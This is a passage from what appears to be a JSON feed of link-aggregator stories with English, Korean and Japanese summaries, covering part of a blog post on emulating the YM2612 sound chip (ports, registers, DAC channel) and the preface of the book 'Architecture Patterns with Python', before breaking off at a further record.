PSG.\n\nGreen Hill Zone with no Z80\nA number of Genesis games are playable without emulating the Z80 (this is not the SNES with its insanely limited 65816/SPC700 communication interface), but it’s very common for audio to be completely missing with no Z80 emulation. Sonic 1 is a bit of an anomaly in how much it drives audio from the 68000.\nWrite Ports\nThe YM2612 has four 8-bit write ports mapped to $4000-$4003 in the Z80 memory map. These ports are mirrored repeatedly throughout the address range $4000-$5FFF.\nAccording to official documentation, these are:\n\n$4000: Address port, group 1 (channels 1-3 + global registers)\n$4001: Data port, group 1\n$4002: Address port, group 2 (channels 4-6)\n$4003: Data port, group 2\n\nWhen software wants to write to a channel 1-3 register or a global register, it first writes the 8-bit register address to $4000, then it writes the 8-bit register value to $4001. For channel 4-6 registers, it writes the register address to $4002 and then the register value to $4003.\n…That’s not actually how it works, though. In reality the chip only has one data port that’s mapped to both $4001 and $4003:\n\n$4000: Address port + Set group 1 flag\n$4002: Address port + Set group 2 flag\n$4001 / $4003: Data port\n\nThe chip remembers whether $4000 or $4002 was last written to, and data port writes will go to either group 1 or group 2 based on which address port was last written. Titan’s Overdrive 2 demo depends on this because it performs all of its data port writes through $4001, though I’m not sure if any games depend on this behavior.\nLooking at the 8-bit YM2612 register addresses, they all fall into three address ranges:\n\n$20-$2F: Global registers\n$30-$9F: Operator control registers\n$A0-$BF: Channel control registers\n\nFor both the $30-$9F registers and the $A0-$BF registers, the lowest 2 bits of the register address are used as the channel index. For example:\n\nExample Register Addresses\nGroup 1 Channel\nGroup 2 Channel\n\n$30, $34, $A0, $A4\n1\n4\n\n$31, $35, $A1, $A5\n2\n5\n\n$32, $36, $A2, $A6\n3\n6\n\n$33, $37, $A3, $A7\nNone\nNone\n\nFor the $30-$9F registers, bits 2 and 3 are used as the operator index, but bitswapped! Concretely:\n\n00 = Operator 1\n01 = Operator 3\n10 = Operator 2\n11 = Operator 4\n\nThe YM2608 manual correctly documents this bitswapping. Sega’s official Genesis documentation on the YM2612 is wrong in this regard.\nExamples:\n\nExample Register Addresses\nOperator\n\n$30, $31, $32, $40, $41, $42\n1\n\n$34, $35, $36, $44, $45, $46\n3\n\n$38, $39, $3A, $48, $49, $4A\n2\n\n$3C, $3D, $3E, $4C, $4D, $4E\n4\n\nYou could parse these out of the address like so:\n\n 1\n 2\n 3\n 4\n 5\n 6\n 7\n 8\n 9\n10\n\nlet mut channel_idx = register_addr & 3;\nif channel_idx == 3 {\n    // Invalid\n    return;\n}\nif group == Group::Two {\n    channel_idx += 3;\n}\n\nlet operator_idx = ((register_addr >> 3) & 1) | ((register_addr >> 1) & 2);\nCopy\n\nRead Port\nThe YM2612 has a single read port which is mapped to $4000 in the Z80 memory map. It contains 3 meaningful bits:\n\nBit 7: Busy flag\nBit 1: Timer B overflow flag\nBit 0: Timer A overflow flag\n\nThat’s it. The other 5 bits are undefined, and the YM2612 does not expose any other information through reads.\nThe busy flag is most commonly used. It indicates whether the YM2612 is currently processing a register write, in which case software should wait to perform any other YM2612 register writes. When games need to write to multiple registers they’ll typically have a loop where they write to the first register, poll the busy flag until it’s 0, write to the next register, poll the busy flag until it’s 0, and repeat until all registers have been written.\nThe two timer overflow bits are the only way for software to get feedback from the two YM2612 timers because they’re not connected to any of the Z80’s interrupt lines. Software that uses the timers needs to poll these bits to know when a timer interval has passed.\nBusy flag behavior doesn’t seem to be completely consistent between different model consoles, and it probably also depends on when exactly the register write occurs within the chip’s internal cycling between channels and operators. I leave the busy flag 1 for 32 internal YM2612 cycles after a data port write and that seems to work ok with everything I’ve tested. (Source for that number)\nAt least in earlier consoles, the busy flag reads as 1 for much longer than it takes the YM2612 to process the write, which it will always do within 24 YM2612 cycles and sometimes do within many fewer cycles - it depends on which register was written to. This makes the busy flag less useful than simply counting Z80 cycles in between writes, though this was likely not known to most developers back in the 80s and 90s.\nRead Port Mirroring: Discrete YM2612 vs. YM3438\nThe read port is mirrored at $4001-$4003…on some consoles. There are at least two games that are highly sensitive to read port mirroring behavior: Earthworm Jim and Hellfire.\nThis behavior difference is based on whether the console contains a discrete YM2612 chip or a YM3438, a slightly modified CMOS version of the YM2612.\nWith the YM3438, $4001-$4003 mirror $4000. Reading from any of these addresses returns the busy flag and timer overflow bits. This chip was used in the Model 1 VA7, Model 2 VA0-VA1, and Model 3 consoles.\nWith the discrete YM2612, reading from $4001-$4003 is officially undefined. It seems like what happens on actual hardware is that reading from $4001-$4003 returns the last value that was read from $4000, but it decays to 0 after a certain amount of time has passed since the last $4000 read. This chip was used in the Model 1 VA0-VA6 and Model 2 VA2 consoles.\nEarthworm Jim occasionally reads the busy flag from $4002 instead of $4000, and on models with the discrete YM2612, this causes extremely noticeable audio stuttering. This happens because the previous $4000 read was sometimes only to poll for one of the timer overflow bits, and if the busy flag was set during that read, the game’s audio driver will spinloop polling $4002 until the status value decays to 0.\n\nEarthworm Jim - Discrete YM2612 behavior\n\nEarthworm Jim - YM3438 behavior\nThe discrete YM2612 recording is using a decay period of around a quarter-second’s worth of cycles. This produces results similar to hardware recordings of this game on consoles with a discrete YM2612.\nHellfire has the opposite problem: It frequently reads the busy flag from $4001 and $4003 instead of $4000, and if it can actually read the busy flag from these addresses, the music will play much slower than it’s supposed to. This means that the music only plays correctly on consoles with a discrete YM2612.\n\nHellfire - Discrete YM2612 behavior\n\nHellfire - YM3438 behavior\nThe game just so happens to write to the YM2612 registers in such a way that even on actual hardware, none of the writes are dropped despite it not correctly reading the busy flag.\nHow to handle this in an emulator is an implementation decision. Making $4001-$4003 reads always return 0 would make both Earthworm Jim and Hellfire sound correct, but it’s not accurate to any actual hardware, and it could break other games. Always using discrete YM2612 behavior breaks Earthworm Jim, and always using YM3438 behavior breaks Hellfire.\nThe most reasonable solution is probably to offer an option of what behavior to emulate, maybe with something like an auto-detect option that automatically uses the ideal behavior for these two games. Other games generally only try to access the read port at $4000.\nBoth of these behaviors are accurate to actual hardware - they’re just accurate to different versions of the hardware.\nFirst Audio Output: DAC Channel\nThe DAC channel is by far the easiest thing to emulate inside the YM2612, so let’s start with that.\nThe DAC channel is controlled entirely by 3 registers:\n\n$2A: DAC channel PCM sample (unsigned 8-bit)\n$2B: DAC channel enabled (Bit 7)\n$B6: L/R panning flags and LFO sensitivity for channels 3 (group 1) and 6 (group 2)\n\nWhen enabled via register $2B, the DAC channel replaces channel 6’s output with the 8-bit PCM sample value that was last written to register $2A. It respects the channel 6 L/R panning flags in register $B6 (group 2), but otherwise none of the channel 6 configuration affects the DAC channel.\nPCM samples are interpreted as unsigned 8-bit values (0-255), but for output they’re converted to signed 8-bit by applying a bias of -128. This signed 8-bit sample is then bit shifted to match the scale of FM synthesis channel outputs.\nThis isn’t really relevant until later, but FM channel outputs are signed 14-bit, so the DAC channel implementation is as simple as:\n\n1\n2\n3\n\nfn dac_channel(sample: u8) -> i16 {\n    (i16::from(sample) - 128) << 6\n}\nCopy\n\nThe YM2612’s DAC only has a 9-bit digital input, but it’s not possible to set the truncated lower 5 bits using the DAC channel, so that’s not important for now.\nFor generating an output sample, you can pretend that you’re mixing 6 channels whose outputs are each on an i14 scale, except right now only 1 channel is emulated:\n\n1\n2\n3\n4\n5\n6\n7\n\nfn output_sample(dac_channel_out: i16) -> f64 {\n    // Convert from i14 scale to [-1, +1)\n    let sample = f64::from(dac_channel_out) / f64::from(1 << 13);\n\n    // Divide by 6 because this is only 1 of 6 channels being mixed\n    sample / 6.0\n}\nCopy\n\nYou could also accumulate the channel outputs into an i32 instead of converting to floating-point, though you’ll likely want to convert to floating-point eventually in order to ensure that volume is scaled correctly.\nWire this up to an audio output, and as long as your emulated Z80 timing is fairly accurate, this is enough to (technically) get some YM2612 audio in games! Including the iconic “SEGA” intro sound in the Sonic games:\n\nSonic the Hedgehog 2 - SEGA sound\n\nSonic the Hedgehog 2 - Emerald Hill Zone (Percussion)\nIt’s a start!\nDAC channel output tends to sound very crunchy and noisy. This is partly because there’s no FIFO or anything to buffer incoming samples - games must constantly send samples to the YM2612 at the desired sample rate using very carefully timed code.\nPlaying at high sample rates doesn’t leave the Z80 with much time to do anything else, plus the timing gets thrown off by bus arbiter delays if the Z80 ever needs to access the 68000 side of the bus (e.g. to read from cartridge ROM). Also, the 68000 needs to remove the Z80 from the bus to safely read from the controller ports, which pretty much every game does at least once per frame.\nAudio quality is further degraded by the chip effectively nearest-neighbor resampling up to 53267 Hz. This introduces lots of additional audio aliasing and noise, particularly if the source data is at a very low sample rate.\nTo Be Continued\nThe next post will cover a probably more interesting topic: exactly how the phase generators in the FM synthesis channels work.\nPart 2 - Phase\n\n            Author: jsgroth\n\n                Link: https://jsgroth.dev/blog/posts/emulating-ym2612-part-1/\n\n            License: CC BY-NC-SA 4.0",
    "summary": {
      "en": "This text is the first part of a series about emulating the Yamaha YM2612 sound chip, used in the Sega Genesis. \n\n**Key Points:**\n\n1. **Challenge of Emulation**: The YM2612 is difficult to emulate due to its many specific details and quirks that affect game audio. Minor mistakes in emulation can lead to significant audio errors.\n\n2. **Source of Information**: The author relies on a detailed online thread and various resources, noting that some official documentation is inaccurate.\n\n3. **FM Synthesis Overview**: The YM2612 uses four-operator FM synthesis, allowing for a wider variety of sounds compared to other chips. It has six audio channels, each capable of complex configurations.\n\n4. **Integration with Genesis**: The YM2612 is integrated with the Sega Genesis, sharing a clock signal with the 68000 CPU. Different components update at various rates, affecting audio output.\n\n5. **Interface**: The Genesis has a split bus for CPU communication. The Z80 CPU controls the YM2612, allowing for efficient audio processing without delays.\n\n6. **Register Access**: The YM2612 has four write ports for sending data and one read port for status feedback. The read port behavior can vary between models, affecting some games’ audio.\n\n7. **DAC Channel**: The DAC channel, which outputs PCM samples, is relatively straightforward to emulate. It processes 8-bit unsigned samples and converts them for output.\n\n8. **Audio Output Challenges**: Emulating the YM2612 involves careful timing and can result in noisy audio due to the lack of buffering and timing issues from CPU interactions.\n\nThe series will continue with more details on phase generators in FM synthesis channels.",
      "ko": "이 텍스트는 세가 제네시스에서 사용된 야마하 YM2612 사운드 칩을 에뮬레이션하는 시리즈의 첫 번째 부분입니다.\n\nYM2612의 에뮬레이션은 여러 가지 세부 사항과 특성 때문에 어려운 도전 과제입니다. 에뮬레이션에서 작은 실수가 발생하면 오디오에 큰 오류가 생길 수 있습니다. 저자는 자세한 온라인 토론과 다양한 자료를 참고하며, 일부 공식 문서가 부정확하다는 점을 지적합니다.\n\nYM2612는 네 개의 연산자를 사용하는 FM 합성을 기반으로 하여, 다른 칩에 비해 더 다양한 소리를 낼 수 있습니다. 이 칩은 여섯 개의 오디오 채널을 가지고 있으며, 각 채널은 복잡한 설정이 가능합니다. YM2612는 세가 제네시스와 통합되어 있으며, 68000 CPU와 클럭 신호를 공유합니다. 다양한 구성 요소가 서로 다른 속도로 업데이트되기 때문에 오디오 출력에 영향을 미칩니다.\n\n제네시스는 CPU 통신을 위한 분리된 버스를 가지고 있습니다. Z80 CPU가 YM2612를 제어하여 지연 없이 효율적인 오디오 처리를 가능하게 합니다. YM2612는 데이터를 전송하기 위한 네 개의 쓰기 포트와 상태 피드백을 위한 하나의 읽기 포트를 가지고 있습니다. 읽기 포트의 동작은 모델에 따라 다를 수 있어 일부 게임의 오디오에 영향을 미칠 수 있습니다.\n\nPCM 샘플을 출력하는 DAC 채널은 비교적 간단하게 에뮬레이션할 수 있습니다. 이 채널은 8비트 부호 없는 샘플을 처리하고 이를 출력으로 변환합니다. YM2612의 에뮬레이션은 세심한 타이밍이 필요하며, CPU 상호작용에서 발생하는 타이밍 문제와 버퍼링 부족으로 인해 시끄러운 오디오가 발생할 수 있습니다.\n\n이 시리즈는 FM 합성 채널의 위상 생성기에 대한 더 많은 세부 사항으로 계속될 예정입니다.",
      "ja": "このテキストは、セガ・ジェネシスで使用されているヤマハYM2612音源チップのエミュレーションに関するシリーズの第一部です。\n\nYM2612のエミュレーションは、その特有の詳細やクセがゲームの音声に影響を与えるため、非常に難しいです。エミュレーションにおける小さなミスが、音声の大きなエラーにつながることがあります。\n\n著者は、詳細なオンラインスレッドやさまざまなリソースを参考にしており、一部の公式文書が不正確であることにも言及しています。\n\nYM2612は、4オペレーターのFM合成を使用しており、他のチップと比べて多様な音を生成できます。6つのオーディオチャンネルを持ち、それぞれが複雑な設定を可能にしています。\n\nYM2612はセガ・ジェネシスに統合されており、68000 CPUとクロック信号を共有しています。異なるコンポーネントがさまざまな速度で更新されるため、音声出力に影響を与えます。\n\nジェネシスはCPU通信のために分割バスを持っています。Z80 CPUがYM2612を制御し、遅延なく効率的に音声処理を行います。\n\nYM2612にはデータを送信するための4つの書き込みポートと、ステータスフィードバック用の1つの読み取りポートがあります。読み取りポートの動作はモデルによって異なり、一部のゲームの音声に影響を与えることがあります。\n\nDACチャンネルはPCMサンプルを出力するもので、エミュレーションは比較的簡単です。8ビットの符号なしサンプルを処理し、出力用に変換します。\n\nYM2612のエミュレーションには慎重なタイミングが必要で、CPUとの相互作用によるバッファリングの欠如やタイミングの問題から、ノイズの多い音声が生じることがあります。\n\nこのシリーズは、FM合成チャンネルにおける位相発生器についての詳細を続けていきます。"
    }
  },
  {
    "id": "c8926decaaaf557b",
    "title": {
      "en": "Entropy Attacks",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.cr.yp.to/20140205-entropy.html",
    "score": 93,
    "by": "todsacerdoti",
    "time": 1742905238,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "541246337a07996d",
    "title": {
      "en": "Architecture Patterns with Python",
      "ko": "파이썬 아키텍처 패턴",
      "ja": "Python建築パターン"
    },
    "type": "story",
    "url": "https://www.cosmicpython.com/book/preface.html",
    "score": 458,
    "by": "asicsp",
    "time": 1743141447,
    "content": "Preface\n\nYou may be wondering who we are and why we wrote this book.\n\nAt the end of Harry’s last book,\nTest-Driven Development with Python (O’Reilly),\nhe found himself asking a bunch of questions about architecture, such as,\nWhat’s the best way of structuring your application so that it’s easy to test?\nMore specifically, so that your core business logic is covered by unit tests,\nand so that you minimize the number of integration and end-to-end tests you need?\nHe made vague references to \"Hexagonal Architecture\" and \"Ports and Adapters\"\nand \"Functional Core, Imperative Shell,\" but if he was honest, he’d have to\nadmit that these weren’t things he really understood or had done in practice.\n\nAnd then he was lucky enough to run into Bob, who has the answers to all these\nquestions.\n\nBob ended up as a software architect because nobody else on his team was\ndoing it. He turned out to be pretty bad at it, but he was lucky enough to run\ninto Ian Cooper, who taught him new ways of writing and thinking about code.\n\nManaging Complexity, Solving Business Problems\n\nWe both work for MADE.com, a European ecommerce company that sells furniture\nonline; there, we apply the techniques in this book to build distributed systems\nthat model real-world business problems. Our example domain is the first system\nBob built for MADE, and this book is an attempt to write down all the stuff we\nhave to teach new programmers when they join one of our teams.\n\nMADE.com operates a global supply chain of freight partners and manufacturers.\nTo keep costs low, we try to optimize the delivery of stock to our\nwarehouses so that we don’t have unsold goods lying around the place.\n\nIdeally, the sofa that you want to buy will arrive in port on the very day\nthat you decide to buy it, and we’ll ship it straight to your house without\never storing it. Getting the timing right is a tricky balancing act when goods take\nthree months to arrive by container ship. Along the way, things get broken or water\ndamaged, storms cause unexpected delays, logistics partners mishandle goods,\npaperwork goes missing, customers change their minds and amend their orders,\nand so on.\n\nWe solve those problems by building intelligent software representing the\nkinds of operations taking place in the real world so that we can automate as\nmuch of the business as possible.\n\nWhy Python?\n\nIf you’re reading this book, we probably don’t need to convince you that Python\nis great, so the real question is \"Why does the Python community need a book\nlike this?\" The answer is about Python’s popularity and maturity: although Python is\nprobably the world’s fastest-growing programming language and is nearing the top\nof the absolute popularity tables, it’s only just starting to take on the kinds\nof problems that the C# and Java world has been working on for years.\nStartups become real businesses; web apps and scripted automations are becoming\n(whisper it) enterprise software.\n\nIn the Python world, we often quote the Zen of Python:\n\"There should be one—and preferably only one—obvious way to do it.\"[1]\nUnfortunately, as project size grows, the most obvious way of doing things\nisn’t always the way that helps you manage complexity and evolving\nrequirements.\n\nNone of the techniques and patterns we discuss in this book are\nnew, but they are mostly new to the Python world. And this book isn’t\na replacement for the classics in the field such as Eric Evans’s\nDomain-Driven Design\nor Martin Fowler’s Patterns of\nEnterprise Application Architecture (both published by Addison-Wesley Professional)—which we often refer to and\nencourage you to go and read.\n\nBut all the classic code examples in the literature do tend to be written in\nJava or C++/#, and if you’re a Python person and haven’t used either of\nthose languages in a long time (or indeed ever), those code listings can be\nquite…trying. There’s a reason the latest edition of that other classic text, Fowler’s\nRefactoring (Addison-Wesley Professional), is in JavaScript.\n\nTDD, DDD, and Event-Driven Architecture\n\nIn order of notoriety, we know of three tools for managing complexity:\n\nTest-driven development (TDD) helps us to build code that is correct\nand enables us to refactor or add new features, without fear of regression.\nBut it can be hard to get the best out of our tests: How do we make sure\nthat they run as fast as possible? That we get as much coverage and feedback\nfrom fast, dependency-free unit tests and have the minimum number of slower,\nflaky end-to-end tests?\n\nDomain-driven design (DDD) asks us to focus our efforts on building a good\nmodel of the business domain, but how do we make sure that our models aren’t\nencumbered with infrastructure concerns and don’t become hard to change?\n\nLoosely coupled (micro)services integrated via messages (sometimes called\nreactive microservices) are a well-established answer to managing complexity\nacross multiple applications or business domains. But it’s not always\nobvious how to make them fit with the established tools of\nthe Python world—Flask, Django, Celery, and so on.\n\nNote\n\nDon’t be put off if you’re not working with (or interested in) microservices.\n    The vast majority of the patterns we discuss,\n    including much of the event-driven architecture material,\n    is absolutely applicable in a monolithic architecture.\n\nOur aim with this book is to introduce several classic architectural patterns\nand show how they support TDD, DDD, and event-driven services.  We hope\nit will serve as a reference for implementing them in a Pythonic way, and that\npeople can use it as a first step toward further research  in this field.\n\nWho Should Read This Book\n\nHere are a few things we assume about you, dear reader:\n\nYou’ve been close to some reasonably complex Python applications.\n\nYou’ve seen some of the pain that comes with trying to manage\nthat complexity.\n\nYou don’t necessarily know anything about DDD or any of the\nclassic application architecture patterns.\n\nWe structure our explorations of architectural patterns around an example app,\nbuilding it up chapter by chapter. We use TDD at\nwork, so we tend to show listings of tests first, followed by implementation.\nIf you’re not used to working test-first, it may feel a little strange at\nthe beginning, but we hope you’ll soon get used to seeing code \"being used\"\n(i.e., from the outside) before you see how it’s built on the inside.\n\nWe use some specific Python frameworks and technologies, including Flask,\nSQLAlchemy, and pytest, as well as Docker and Redis. If you’re already\nfamiliar with them, that won’t hurt, but we don’t think it’s required.  One of\nour main aims with this book is to build an architecture for which specific\ntechnology choices become minor implementation details.\n\nA Brief Overview of What You’ll Learn\n\nThe book is divided into two parts; here’s a look at the topics we’ll cover\nand the chapters they live in.\n\n#part1\n\nDomain modeling and DDD (Chapters 1, 2 and 7)\n\nAt some level, everyone has learned the lesson that complex business\nproblems need to be reflected in code, in the form of a model of the domain.\nBut why does it always seem to be so hard to do without getting tangled\nup with infrastructure concerns, our web frameworks, or whatever else?\nIn the first chapter we give a broad overview of domain modeling and DDD, and we\nshow how to get started with a model that has no external dependencies, and\nfast unit tests. Later we return to DDD patterns to discuss how to choose\nthe right aggregate, and how this choice relates to questions of data\nintegrity.\n\nRepository, Service Layer, and Unit of Work patterns (Chapters 2, 4, and 5)\n\nIn these three chapters we present three closely related and\nmutually reinforcing patterns that support our ambition to keep\nthe model free of extraneous dependencies.  We build a layer of\nabstraction around persistent storage, and we build a service\nlayer to define the entrypoints to our system and capture the\nprimary use cases. We show how this layer makes it easy to build\nthin entrypoints to our system, whether it’s a Flask API or a CLI.\n\nSome thoughts on testing and abstractions (Chapter 3 and 5)\n\nAfter presenting the first abstraction (the Repository pattern), we take the\nopportunity for a general discussion of how to choose abstractions, and\nwhat their role is in choosing how our software is coupled together. After\nwe introduce the Service Layer pattern, we talk a bit about achieving a test pyramid\nand writing unit tests at the highest possible level of abstraction.\n\n#part2\n\nEvent-driven architecture (Chapters 8-11)\n\nWe introduce three more mutually reinforcing patterns:\nthe Domain Events, Message Bus, and Handler patterns.\nDomain events are a vehicle for capturing the idea that\nsome interactions with a system are triggers for others.\nWe use  a message bus to allow actions to trigger events\nand call appropriate handlers.\nWe move on to discuss how events can be used as a pattern\nfor integration between services in a microservices architecture.\nFinally, we distinguish between commands and events.\nOur application is now fundamentally a message-processing system.\n\nCommand-query responsibility segregation ([chapter_12_cqrs])\n\nWe present an example of command-query responsibility segregation,\nwith and without events.\n\nDependency injection ([chapter_13_dependency_injection])\n\nWe tidy up our explicit and implicit dependencies and implement a\nsimple dependency injection framework.\n\nAdditional Content\n\nHow do I get there from here? ([epilogue_1_how_to_get_there_from_here])\n\nImplementing architectural patterns always looks easy when you show a simple\nexample, starting from scratch, but many of you will probably be wondering how\nto apply these principles to existing software. We’ll provide a\nfew pointers in the epilogue and some links to further reading.\n\nExample Code and Coding Along\n\nYou’re reading a book, but you’ll probably agree with us when we say that\nthe best way to learn about code is to code.  We learned most of what we know\nfrom pairing with people, writing code with them, and learning by doing, and\nwe’d like to re-create that experience as much as possible for you in this book.\n\nAs a result, we’ve structured the book around a single example project\n(although we do sometimes throw in other examples). We’ll build up this project as the chapters progress, as if you’ve paired with us and\nwe’re explaining what we’re doing and why at each step.\n\nBut to really get to grips with these patterns, you need to mess about with the\ncode and get a feel for how it works. You’ll find all the code on\nGitHub; each chapter has its own branch. You can find a list of the branches on GitHub as well.\n\nHere are three ways you might code along with the book:\n\nStart your own repo and try to build up the app as we do, following the\nexamples from listings in the book, and occasionally looking to our repo\nfor hints. A word of warning, however: if you’ve read Harry’s previous book\nand coded along with that, you’ll find that this book requires you to figure out more on\nyour own; you may need to lean pretty heavily on the working versions on GitHub.\n\nTry to apply each pattern, chapter by chapter, to your own (preferably\nsmall/toy) project, and see if you can make it work for your use case.  This\nis high risk/high reward (and high effort besides!). It may take quite some\nwork to get things working for the specifics of your project, but on the other\nhand, you’re likely to learn the most.\n\nFor less effort, in each chapter we outline an \"Exercise for the Reader,\"\nand point you to a GitHub location where you can download some partially finished\ncode for the chapter with a few missing parts to write yourself.\n\nParticularly if you’re intending to apply some of these patterns in your own\nprojects, working through a simple example is a great way to\nsafely practice.\n\nTip\n\nAt the very least, do a git checkout of the code from our repo as you\n    read each chapter. Being able to jump in and see the code in the context of\n    an actual working app will help answer a lot of questions as you go, and\n    makes everything more real. You’ll find instructions for how to do that\n    at the beginning of each chapter.\n\nLicense\n\nThe code (and the online version of the book) is licensed under a Creative\nCommons CC BY-NC-ND license, which means you are free to copy and share it with\nanyone you like, for non-commercial purposes, as long as you give attribution.\nIf you want to re-use any of the content from this book and you have any\nworries about the license, contact O’Reilly at permissions@oreilly.com.\n\nThe print edition is licensed differently; please see the copyright page.\n\nConventions Used in This Book\n\nThe following typographical conventions are used in this book:\n\nItalic\n\nIndicates new terms, URLs, email addresses, filenames, and file extensions.\n\nConstant width\n\nUsed for program listings, as well as within paragraphs to refer to program elements such as variable or function names, databases, data types, environment variables, statements, and keywords.\n\nConstant width bold\n\nShows commands or other text that should be typed literally by the user.\n\nConstant width italic\n\nShows text that should be replaced with user-supplied values or by values determined by context.\n\nTip\n\nThis element signifies a tip or suggestion.\n\nNote\n\nThis element signifies a general note.\n\nWarning\n\nThis element indicates a warning or caution.\n\nO’Reilly Online Learning\n\nNote\n\nFor more than 40 years, O’Reilly Media has provided technology and business training, knowledge, and insight to help companies succeed.\n\nOur unique network of experts and innovators share their knowledge and expertise through books, articles, conferences, and our online learning platform. O’Reilly’s online learning platform gives you on-demand access to live training courses, in-depth learning paths, interactive coding environments, and a vast collection of text and video from O’Reilly and 200+ other publishers. For more information, please visit http://oreilly.com.\n\nHow to Contact O’Reilly\n\nPlease address comments and questions concerning this book to the publisher:\n\n  O’Reilly Media, Inc.\n  1005 Gravenstein Highway North\n  Sebastopol, CA 95472\n  800-998-9938 (in the United States or Canada)\n  707-829-0515 (international or local)\n  707-829-0104 (fax)\n\nWe have a web page for this book, where we list errata, examples, and any additional information. You can access this page at https://oreil.ly/architecture-patterns-python.\n\nEmail bookquestions@oreilly.com to comment or ask technical questions about this book.\n\nFor more information about our books, courses, conferences, and news, see our website at http://www.oreilly.com.\n\nFind us on Facebook: http://facebook.com/oreilly\n\nFollow us on Twitter: http://twitter.com/oreillymedia\n\nWatch us on YouTube: http://www.youtube.com/oreillymedia\n\nAcknowledgments\n\nTo our tech reviewers, David Seddon, Ed Jung, and Hynek Schlawack: we absolutely\ndo not deserve you. You are all incredibly dedicated, conscientious, and\nrigorous. Each one of you is immensely smart, and your different points of\nview were both useful and complementary to each other. Thank you from the\nbottom of our hearts.\n\nGigantic thanks also to all our readers so far for their comments and\nsuggestions:\nIan Cooper, Abdullah Ariff, Jonathan Meier, Gil Gonçalves, Matthieu Choplin,\nBen Judson, James Gregory, Łukasz Lechowicz, Clinton Roy, Vitorino Araújo,\nSusan Goodbody, Josh Harwood, Daniel Butler, Liu Haibin, Jimmy Davies, Ignacio\nVergara Kausel, Gaia Canestrani, Renne Rocha, pedroabi, Ashia Zawaduk, Jostein\nLeira, Brandon Rhodes, Jazeps Basko, simkimsia, Adrien Brunet, Sergey Nosko,\nDmitry Bychkov,\nand many more; our apologies if we missed you on this list.\n\nSuper-mega-thanks to our editor Corbin Collins for his gentle chivvying, and\nfor being a tireless advocate of the reader. Similarly-superlative thanks to\nthe production staff, Katherine Tozer, Sharon Wilkey, Ellen Troutman-Zaig, and\nRebecca Demarest, for your dedication, professionalism, and attention to\ndetail. This book is immeasurably improved thanks to you.\n\nAny errors remaining in the book are our own, naturally.\n\n  << Previous - Appendix E: Validation\n  Next - Introduction >>",
    "summary": {
      "en": "### Summary of the Preface\n\nThis book is written by Harry and Bob, who work at MADE.com, an ecommerce company that sells furniture online. After Harry's previous book on Test-Driven Development (TDD) with Python, he had many questions about application architecture and testing practices. He met Bob, who has valuable insights on these topics, and they decided to compile their knowledge into this book.\n\nThey aim to address how to effectively structure applications for testing while managing complexity and adapting to changing business needs. The book will discuss various architectural patterns and practices, particularly focusing on Python, which is becoming more widely used for complex applications.\n\nThe authors explain that while many concepts are not new, they are often unfamiliar to the Python community. The book will cover themes like TDD, Domain-Driven Design (DDD), and event-driven architecture, helping readers understand how to apply these patterns using Python frameworks like Flask and SQLAlchemy.\n\nThe book is structured around a single example project, allowing readers to learn by coding along. It includes exercises to practice the concepts discussed. The authors encourage readers to engage with the provided code on GitHub to enhance their learning experience.",
      "ko": "이 책은 온라인 가구 판매 회사인 MADE.com에서 일하는 해리와 밥이 썼습니다. 해리는 이전에 파이썬을 이용한 테스트 주도 개발(TDD)에 관한 책을 집필한 후, 애플리케이션 아키텍처와 테스트 관행에 대해 많은 질문을 가지게 되었습니다. 그러던 중, 이 주제에 대한 귀중한 통찰력을 가진 밥을 만나게 되었고, 그들의 지식을 모아 이 책을 집필하기로 결정했습니다.\n\n이 책의 목표는 복잡성을 관리하고 변화하는 비즈니스 요구에 적응하면서 테스트를 위한 애플리케이션 구조를 효과적으로 설계하는 방법을 다루는 것입니다. 다양한 아키텍처 패턴과 실천 방법에 대해 논의하며, 특히 복잡한 애플리케이션에 점점 더 많이 사용되고 있는 파이썬에 중점을 두고 있습니다.\n\n저자들은 많은 개념이 새롭지 않지만, 파이썬 커뮤니티에서는 종종 낯설게 느껴진다고 설명합니다. 이 책은 TDD, 도메인 주도 설계(DDD), 이벤트 주도 아키텍처와 같은 주제를 다루며, 독자들이 Flask와 SQLAlchemy와 같은 파이썬 프레임워크를 사용하여 이러한 패턴을 적용하는 방법을 이해하도록 돕습니다.\n\n책은 하나의 예제 프로젝트를 중심으로 구성되어 있어 독자들이 코드를 따라 작성하면서 배울 수 있도록 돕습니다. 논의된 개념을 연습할 수 있는 연습문제도 포함되어 있습니다. 저자들은 독자들이 GitHub에 제공된 코드를 활용하여 학습 경험을 향상시키기를 권장합니다.",
      "ja": "この本は、オンラインで家具を販売するeコマース企業MADE.comで働くハリーとボブによって書かれました。ハリーは以前、Pythonを使ったテスト駆動開発（TDD）に関する本を執筆しましたが、その中でアプリケーションのアーキテクチャやテスト手法について多くの疑問を持ちました。そこで、これらのテーマに関する貴重な見識を持つボブと出会い、彼らの知識をこの本にまとめることにしました。\n\n彼らは、テストのためにアプリケーションを効果的に構築しつつ、複雑さを管理し、変化するビジネスニーズに適応する方法を探求します。本書では、さまざまなアーキテクチャパターンや実践について議論し、特に複雑なアプリケーションに広く使用されているPythonに焦点を当てます。\n\n著者たちは、多くの概念は新しいものではないが、Pythonコミュニティにはあまり知られていないことが多いと説明しています。本書では、TDD、ドメイン駆動設計（DDD）、イベント駆動アーキテクチャといったテーマを取り上げ、FlaskやSQLAlchemyなどのPythonフレームワークを使ってこれらのパターンをどのように適用するかを理解できるようにします。\n\n本書は、単一の例プロジェクトを中心に構成されており、読者はコードを実際に書きながら学ぶことができます。また、議論された概念を練習するための演習も含まれています。著者たちは、GitHubに提供されたコードに積極的に取り組むことで、学習体験を向上させることを勧めています。"
    }
  },
  {
    "id": "e1174069efe65757",
    "title": {
      "en": "Giant, fungus-like organism may be a completely unknown branch of life",
      "ko": "거대 곰팡이 생명체의 비밀",
      "ja": "未知の巨大菌類"
    },
    "type": "story",
    "url": "https://www.livescience.com/animals/giant-fungus-like-organism-may-be-a-completely-unknown-branch-of-life",
    "score": 299,
    "by": "wglb",
    "time": 1743117328,
